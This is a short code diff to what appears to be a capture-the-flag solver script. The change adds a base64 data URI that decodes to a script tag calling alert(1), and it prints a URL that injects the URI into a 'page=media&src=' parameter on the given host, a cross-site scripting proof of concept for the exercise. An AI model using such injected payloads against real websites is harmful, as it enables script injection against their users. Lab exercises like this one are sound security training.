@@ -29,10 +29,11 @@ def check_host_name(host_name):
 
 if __name__ == '__main__':
     try:
+        data = 'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTs8L3NjcmlwdD4='
         host_name = sys.argv[1]
 
         if check_host_name(host_name):
-            print(get_flag(host_name))
+            print(f"04 : {get_flag(host_name)} - nsa image http://{host_name}/?page=media&src={data}")
         else:
             raise Exception('Incorrect host name')
     except Exception as e:
